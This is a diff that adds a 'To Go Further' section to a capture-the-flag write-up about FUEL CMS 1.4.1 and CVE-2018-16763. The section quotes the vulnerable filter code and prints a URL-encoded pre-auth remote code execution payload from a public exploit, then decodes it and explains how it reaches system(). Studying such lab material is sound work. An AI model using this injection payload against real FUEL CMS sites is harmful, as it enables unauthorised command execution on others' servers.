@@ -4,6 +4,10 @@ Laurent Chauvin | November 01, 2022
 
 ## Resources
 
+[1] https://cve.circl.lu/cve/CVE-2018-16763
+
+[2] https://github.com/daylightstudio/FUEL-CMS/commit/6c72834a0d8d3bc34604b9ae0dbb6eef32c0070e
+
 ## Progress
 
 ```
@@ -2703,3 +2707,72 @@ b9bbcb33e11b80be759c4e844862482d
 ```
 b9bbcb33e11b80be759c4e844862482d
 ```
+
+### To Go Further
+
+I noticed it after the end of the challenge, but main page display this at the bottom
+```
+That's it!
+
+To access the FUEL admin, go to:
+http://10.10.158.215/fuel
+User name: admin
+Password: admin (you can and should change this password and admin user information after logging in)
+```
+
+This vulnerability has been reported in [1] as CVE-2018-16763 and described as
+```
+FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter. This can lead to Pre-Auth Remote Code Execution.
+```
+
+When looking at the code in [2]
+```
+@@ -900,6 +900,7 @@ public function select()
+                $filter = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $filter));
+                $this->js_controller_params['method'] = 'select';
+
+
+                $this->load->helper('array');
+                $this->load->helper('form');
+                $this->load->library('form_builder');
+@@ -921,15 +922,16 @@ public function select()
+                // apply filter
+                if ( ! empty($filter))
+                {
+                        $filter_callback = create_function('$a', 'return preg_match(\'#^'.$filter.'$#\', $a);');
+
+                        if (!empty($has_pdfs))
+                        {
+                                $options[lang('page_select_pages')] = array_filter($options[lang('page_select_pages')], $filter_callback);
+                                $options[lang('page_select_pdfs')] = array_filter($options[lang('page_select_pdfs')], $filter_callback);
+                        }
+                        else
+                        {
+                                $options = array_filter($options, $filter_callback);    
+                                $options = array_filter($options, $filter_callback);
+                        }
+                }
+
+
+```
+
+We notice that the $filter parameter is not properly escaped.
+
+This line ```$filter = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $filter));``` simply replace the string ':any' by '.+', to be compatible with ```preg_match```.
+
+This line in the exploit
+```py
+burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
+```
+
+looks like this after URL decoding
+```py
+burp0_url = url "/fuel/pages/select/?filter='+pi(print($a='system'))+$a('" urllib.parse.quote(xxxx) "')+'"
+```
+
+As quotes are not escaped, we can break out of the ```preg_match``` function and run some php code.
+As the print command will evaluated code inside it before printing it, this command ```print($a='system')``` will create a function 'a' that will represent the ```system``` command.
+Next, when calling ```$a(payload)``` this will be interpreted as ```system(payload)```.
+
+I wondered for a while why the ```pi()``` function was used, especially because the ```pi``` function does not take arguments in Php and just return the value of Pi.
+I believe this is because the ```print()``` command return 1 (as opposed to ```echo``` that does not return any value), and the ```pi()``` function here is used to not display the returned value of print.
